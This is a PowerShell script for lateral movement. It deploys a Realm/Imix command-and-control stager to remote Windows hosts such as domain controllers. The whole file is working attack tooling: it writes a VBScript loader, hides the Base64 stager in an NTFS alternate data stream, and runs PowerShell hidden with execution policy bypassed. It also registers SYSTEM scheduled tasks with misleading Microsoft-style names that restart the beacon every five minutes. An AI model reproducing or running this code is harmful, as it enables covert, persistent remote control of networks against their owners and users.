function Invoke-LateralDeploySyc {
    <#
    .SYNOPSIS
        Deploys the ADS-Drop-System (Realm/Imix) payload and persistence to remote hosts via Invoke-Command.
    
    .DESCRIPTION
        This function handles the administrative deployment of the ADS-Drop-System.
        It transfers the VBScript loader, hides the Realm Imix PowerShell stager in an ADS stream,
        and creates two highly resilient, stealthy Scheduled Tasks for persistence.
        
    .PARAMETER TargetHosts
        Array of target hostnames/IP addresses.
    
    .PARAMETER RealmStager
        The final, **Base64-encoded** string of the Realm Imix PowerShell stager.
        (You will get this from your C2 console, fully encoded/obfuscated).
    
    .PARAMETER Credential
        PSCredential object for remote execution (optional).
    
    .EXAMPLE
        # 1. Get Stager (Example only - use your actual Realm output)
        $RealmStager = "IABlAHgAKAAKA...[Actual Realm Base64 String]" 
        
        # 2. Deploy
        $targets = @('DC01', 'SRV01')
        Invoke-LateralDeploySyc -TargetHosts $targets -RealmStager $RealmStager -Verbose

    .EXAMPLE
        $cred = Get-Credential
        Invoke-LateralDeploySyc -TargetHosts ("192.168.1.100") -RealmStager $RealmStager -Credential $cred
    #>
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='High')]
    param(
        [Parameter(Mandatory = $true)]
        [string[]]$TargetHosts,
        
        [Parameter(Mandatory = $true)]
        [string]$RealmStager, # This is the full, encoded IMIX stager string
        
        [PSCredential]$Credential
    )

    # VBScript payload (app_log_a.vbs) - Corrected content for ADS reading
    $VBScriptContent = @"
' C:\ProgramData\app_log_a.vbs
' ADS-Drop-System Stage 0 Loader: Reads Imix Stager from ADS and Executes.

On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

' Path to the Alternate Data Stream containing the Realm Imix PowerShell Stager
ADSPath = "C:\ProgramData\SystemCache.dat:syc_core"

' --- 1. Read PowerShell Stager from ADS using ADODB.Stream ---
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 2 ' Specify text mode (UTF-8)
objStream.Charset = "utf-8"
objStream.Open

objStream.LoadFromFile ADSPath ' Load the ADS content (Realm's stager)

' The ADS stream contains Realm's full, encoded PowerShell command (The Stager)
PowerShellStager = objStream.ReadText

objStream.Close
Set objStream = Nothing

' --- 2. Execute the PowerShell Stager invisibly ---
' The stager is executed directly as a command.
PowerShellCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command """ & PowerShellStager & """"
WshShell.Run PowerShellCmd, 0, False
"@

    # Remote deployment script block
    $RemoteScriptBlock = {
        param($VBSContent, $StagerString)

        if ($PSCmdlet.ShouldProcess("creating VBS file, ADS, and scheduled tasks")) {
            try {
                $ErrorActionPreference = 'Stop'
                $ProgramDataPath = 'C:\ProgramData'
                $VbsPath = "$ProgramDataPath\app_log_a.vbs"
                $DatPath = "$ProgramDataPath\SystemCache.dat"
                $ADSStream = "$DatPath:syc_core"
                
                # --- Step 1: Write VBScript Loader ---
                if (-not (Test-Path $ProgramDataPath)) {
                    New-Item -Path $ProgramDataPath -ItemType Directory -Force | Out-Null
                }
                $VBSContent | Out-File -FilePath $VbsPath -Encoding Default -Force
                if (-not (Test-Path $VbsPath)) { throw "Failed to write VBScript" }
                
                # --- Step 2: Hide Realm Stager in ADS Stream ---
                # Create empty host file first if it doesn't exist
                if (-not (Test-Path $DatPath)) {
                    '' | Out-File -FilePath $DatPath -Encoding ASCII -Force
                }
                
                # Write the Realm Stager string directly to the ADS stream
                # We use Add-Content and bypass the file system object complications
                $StagerString | Out-File -FilePath $ADSStream -Encoding UTF8 -Force
                
                # --- Step 3: Create Logon Persistence Task (`KernelConsolidator`) ---
                $logonTaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B `"$VbsPath`""
                $logonTaskTrigger = New-ScheduledTaskTrigger -AtLogOn
                $logonTaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
                $logonTaskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
                
                $logonTask = New-ScheduledTask -Action $logonTaskAction -Trigger $logonTaskTrigger -Settings $logonTaskSettings -Principal $logonTaskPrincipal
                Register-ScheduledTask -TaskName "\Microsoft\Windows\Customer Experience Improvement Program\KernelConsolidator" -InputObject $logonTask -Force -User "SYSTEM"
                
                # --- Step 4: Create Resilience Task (`ProcessMonitor`) ---
                # Resilience script runs the VBScript if the beacon (sycsc) is not found
                $resilienceScript = @"
\$beacon = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { \$_.CommandLine -like "*$StagerString*" }
if (-not \$beacon) {
    & wscript.exe //B "$VbsPath"
}
"@
                # Note: We look for the stager command in powershell to check if it's running, 
                # as the Imix agent name can vary or be invisible.
                
                $resilienceAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$resilienceScript`""
                $resilienceTrigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue) -At (Get-Date)
                $resilienceSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
                $resiliencePrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
                
                $resilienceTask = New-ScheduledTask -Action $resilienceAction -Trigger $resilienceTrigger -Settings $resilienceSettings -Principal $resiliencePrincipal
                Register-ScheduledTask -TaskName "\Microsoft\Windows\SystemCheck\ProcessMonitor" -InputObject $resilienceTask -Force -User "SYSTEM"

                return @{
                    Success = $true
                    Message = "Deployment successful - Realm Imix Stager hidden in ADS."
                }
            }
            catch {
                return @{
                    Success = $false
                    Message = $_.Exception.Message
                    ErrorDetails = $_.ToString()
                }
            }
        }
    }

    # Execute Deployment Across Targets (Results & Reporting)
    $results = @()
    foreach ($target in $TargetHosts) {
        Write-Verbose "Attempting deployment to $target..."
        
        try {
            # Use -ArgumentList $VBScriptContent, $RealmStager (the stager *string*)
            $result = Invoke-Command -ComputerName $target -ScriptBlock $RemoteScriptBlock -ArgumentList $VBScriptContent, $RealmStager -Credential $Credential -ErrorAction Stop
            
            $status = if ($result.Success) { "SUCCESS" } else { "FAILED" }
            $results += [PSCustomObject]@{ Hostname = $target; Status = $status; Message = $result.Message }
            Write-Host "[$status] $target: $($result.Message)" -ForegroundColor $(if ($result.Success) { "Green" } else { "Red" })
        }
        catch {
            $results += [PSCustomObject]@{ Hostname = $target; Status = "ERROR"; Message = "Invoke-Command failed: $($_.Exception.Message)" }
            Write-Host "[ERROR] $target: Invoke-Command failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # Summary
    $successCount = ($results | Where-Object { $_.Status -eq "SUCCESS" }).Count
    $totalCount = $results.Count
    Write-Host "`n=== DEPLOYMENT SUMMARY ===" -ForegroundColor Cyan
    Write-Host "Successful: $successCount / $totalCount" -ForegroundColor $(if ($successCount -eq $totalCount) { "Green" } else { "Yellow" })
    
    return $results
}
